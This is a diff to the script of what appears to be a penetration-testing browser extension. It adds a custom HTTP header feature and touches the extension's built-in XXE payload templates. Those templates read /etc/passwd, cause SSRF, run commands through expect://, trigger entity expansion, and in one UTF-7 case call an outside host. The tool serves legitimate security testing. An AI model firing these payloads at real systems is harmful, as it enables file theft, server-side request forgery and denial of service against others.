@@ -3,6 +3,7 @@ let postDataField = $('#post_data_field');
 let refererField = $('#referer_field');
 let userAgentField = $('#user_agent_field');
 let cookieField = $('#cookie_field');
+let headerField = $('[name="header_field"]');
 
 let loadUrlBtn = $('#load_url');
 let splitUrlBtn = $('#split_url');
@@ -12,12 +13,15 @@ let enablePostBtn = $('#enable_post_btn');
 let enableRefererBtn = $('#enable_referer_btn');
 let enableUserAgentBtn = $('#enable_user_agent_btn');
 let enableCookieBtn = $('#enable_cookie_btn');
+let addHeader = $('#add_header');
 let clearAllBtn = $('#clear_all');
 
 const menu_btn_array = ['md5', 'sha1', 'sha256', 'rot13', 'base64_encode', 'base64_decode', 'url_encode', 'url_decode', 'hex_encode', 'hex_decode', 'sql_mysql_char', 'sql_basic_info_column', 'sql_union_all_select', 'sql_union_all_select_null', 'sql_convert_utf8', 'sql_convert_latin1', 'sql_mssql_char', 'sql_oracle_char', 'sql_union_statement', 'sql_spaces_to_inline_comments', 'xss_string_from_charcode', 'xss_html_characters', 'xss_alert', 'xxe_lfi', 'xxe_blind', 'xxe_load_resource', 'xxe_ssrf', 'xxe_rce', 'xxe_xee_local', 'xxe_xee_remove', 'xxe_utf7', 'jsonify', 'uppercase', 'lowercase'];
 
-let currentTabId = browser.devtools.inspectedWindow.tabId;
+let currentTabId = browser.devtools != undefined ? browser.devtools.inspectedWindow.tabId : null;
 let currentFocusField = urlField;
+
+let currentHeaders = [];
 
 function onFocusListener() {
     currentFocusField = $(this);
@@ -96,11 +100,35 @@ function loadUrl() {
             if(h.cookie){
                 cookieField.val(h.cookie);
             }
-            if(h.user_agent){
-                userAgentField.val(h.user_agent);
+            if(h.custom.length !== []){
+                currentHeaders = h.custom;
+                addCurrentHeaders(h.custom);
             }
         }
     });
+}
+
+function addCurrentHeaders(customCurrentHeaders) {
+    for(let index in customCurrentHeaders) {
+        let headersAlreadyLoaded = $('[name="header_field"]');
+        let alreadyExist = false;
+        let value = index + ": " + customCurrentHeaders[index];
+
+        for(let i = 0; i < headersAlreadyLoaded.length; i++) {
+            if(headersAlreadyLoaded[i].value.toLowerCase().trim() === value.toLowerCase().trim())
+                alreadyExist = true;
+        }
+
+        if(alreadyExist)
+            continue;
+
+        let header = headerField.closest('.block');
+        header = header.get(0).cloneNode(true);
+        $(header).removeClass('block');
+        $(header).find('input').removeAttr('disabled');
+        $(header).find('input').val(index + ": " + customCurrentHeaders[index]);
+        headerField.closest('.block').after(header);
+    }
 }
 
 function splitUrl() {
@@ -120,7 +148,8 @@ function execute() {
     let Headers = {
         referer: null,
         user_agent: null,
-        cookie: null
+        cookie: null,
+        custom: null
     }
 
     let post_data = null;
@@ -138,6 +167,21 @@ function execute() {
     if (enablePostBtn.prop('checked')) {
         method = 'POST';
         post_data = getFieldFormData(postDataField.val());
+    }
+    if ($('[name="header_field"]').not(':disabled').length > 0) {
+        let customHeaders = $('[name="header_field"]').not(':disabled');
+        Headers.custom = [];
+
+        for(let i = 0; i < customHeaders.length; i++) {
+
+            let header = customHeaders[i].value;
+
+            if(!header.match(/[a-zA-Z\-]*: .*/))
+                continue;
+
+            [key, value] = header.split(':');
+            Headers.custom[key.trim()] = value.trim();
+        }
     }
 
     let url = urlField.val();
@@ -408,7 +452,7 @@ function onclickMenu(action, val) {
             break;
 
         case 'xxe_lfi':
-            let xxeStr = '<?xml version="1.0"?>' +
+            var xxeStr = '<?xml version="1.0"?>' +
             '<!DOCTYPE foo [  ' +
             '<!ELEMENT foo (#ANY)>' +
             '<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>';
@@ -416,7 +460,7 @@ function onclickMenu(action, val) {
             break;
 
         case 'xxe_blind':
-            xxeStr = '<?xml version="1.0"?>' +
+            var xxeStr = '<?xml version="1.0"?>' +
             '<!DOCTYPE foo [' +
             '<!ELEMENT foo (#ANY)>' +
             '<!ENTITY % xxe SYSTEM "file:///etc/passwd">' +
@@ -425,7 +469,7 @@ function onclickMenu(action, val) {
             break;
 
         case 'xxe_load_resource':
-            xxeStr = '<?xml version="1.0"?>' +
+            var xxeStr = '<?xml version="1.0"?>' +
             '<!DOCTYPE foo [' +
             '<!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php">]>' +
             '<foo><result>&ac;</result></foo>';
@@ -433,7 +477,7 @@ function onclickMenu(action, val) {
             break;
 
         case 'xxe_ssrf':
-            xxeStr = '<?xml version="1.0"?>' +
+            var xxeStr = '<?xml version="1.0"?>' +
             '<!DOCTYPE foo [  ' +
             '<!ELEMENT foo (#ANY)>' +
             '<!ENTITY xxe SYSTEM "https://www.example.com/text.txt">]><foo>&xxe;</foo>';
@@ -441,7 +485,7 @@ function onclickMenu(action, val) {
             break;
 
         case 'xxe_rce':
-            xxeStr = '[ run "uname" command]' +
+            var xxeStr = '[ run "uname" command]' +
             '<?xml version="1.0" encoding="ISO-8859-1"?>' +
             '<!DOCTYPE foo [ <!ELEMENT foo ANY >' +
             '<!ENTITY xxe SYSTEM "expect://uname" >]>' +
@@ -452,7 +496,7 @@ function onclickMenu(action, val) {
             break;
 
         case 'xxe_xee_local':
-            xxeStr = '<?xml version="1.0"?>' +
+            var xxeStr = '<?xml version="1.0"?>' +
             '<!DOCTYPE lolz [' +
             '<!ENTITY lol "lol">' +
             '<!ELEMENT lolz (#PCDATA)>' +
@@ -471,7 +515,7 @@ function onclickMenu(action, val) {
             break;
 
         case 'xxe_xee_remove':
-            xxeStr = '<?xml version="1.0"?>' +
+            var xxeStr = '<?xml version="1.0"?>' +
             '<!DOCTYPE lolz [' +
             '<!ENTITY test SYSTEM "https://example.com/entity1.xml">]>' +
             '<lolz><lol>3..2..1...&test<lol></lolz>';
@@ -479,7 +523,7 @@ function onclickMenu(action, val) {
             break;
 
         case 'xxe_utf7':
-            xxeStr = '<?xml version="1.0" encoding="UTF-7"?>' +
+            var xxeStr = '<?xml version="1.0" encoding="UTF-7"?>' +
             '+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4' +
             '+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+' +
             '+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4';
@@ -513,22 +557,29 @@ clearAllBtn.bind('click', function () {
 });
 
 enablePostBtn.click(function () {
-    toggleElement($(this), postDataField.closest('.block'))
+    toggleElement($(this), postDataField.closest('.block'));
 });
 enableRefererBtn.click(function () {
-    toggleElement($(this), refererField.closest('.block'))
+    toggleElement($(this), refererField.closest('.block'));
 });
 enableUserAgentBtn.click(function () {
-    toggleElement($(this), userAgentField.closest('.block'))
+    toggleElement($(this), userAgentField.closest('.block'));
 });
 enableCookieBtn.click(function () {
-    toggleElement($(this), cookieField.closest('.block'))
+    toggleElement($(this), cookieField.closest('.block'));
+});
+addHeader.click(function () {
+    let header = headerField.closest('.block');
+    header = header.get(0).cloneNode(true);
+    $(header).removeClass('block');
+    $(header).find('input').removeAttr('disabled');
+    headerField.closest('.block').after(header);
 });
 
 //Add event listener
 menu_btn_array.forEach(function (elementID) {
     $('#' + elementID).bind('click', function(){
-        onclickMenu(elementID)
+        onclickMenu(elementID);
     });
 });
 
